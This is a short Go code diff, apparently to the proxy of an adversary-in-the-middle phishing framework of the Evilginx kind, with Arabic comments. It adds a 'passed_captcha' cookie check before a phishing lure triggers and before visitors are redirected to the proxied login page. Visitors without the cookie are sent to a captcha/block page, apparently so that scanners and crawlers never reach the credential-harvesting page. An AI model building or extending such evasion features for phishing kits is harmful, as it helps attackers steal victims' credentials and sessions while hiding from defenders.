@@ -308,6 +308,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 					if err == nil {
 						log.Debug("triggered lure for path '%s'", req_path)
+						
+						// التحقق من وجود كوكي الكابتشا عند الوصول لرابط lure
+						captcha_cookie, err := req.Cookie("passed_captcha")
+						if err != nil || captcha_cookie.Value != "1" {
+							log.Warning("[%s] محاولة وصول لرابط lure بدون التحقق من الكابتشا: %s [%s]", hiblue.Sprint(pl_name), req_url, remote_addr)
+							return p.blockRequest(req) // عرض صفحة الكابتشا
+						}
 					}
 
 					var create_session bool = true
@@ -586,6 +593,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if pl != nil {
 					_, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 					if err == nil {
+						// التحقق من وجود كوكي الكابتشا قبل إعادة التوجيه إلى صفحة تسجيل الدخول
+						captcha_cookie, err := req.Cookie("passed_captcha")
+						if err != nil || captcha_cookie.Value != "1" {
+							log.Warning("[%s] محاولة وصول لصفحة تسجيل الدخول بدون التحقق من الكابتشا: %s [%s]", hiblue.Sprint(pl_name), req_url, remote_addr)
+							return p.blockRequest(req) // عرض صفحة الكابتشا
+						}
+						
 						// redirect from lure path to login url
 						rurl := pl.GetLoginUrl()
 						u, err := url.Parse(rurl)
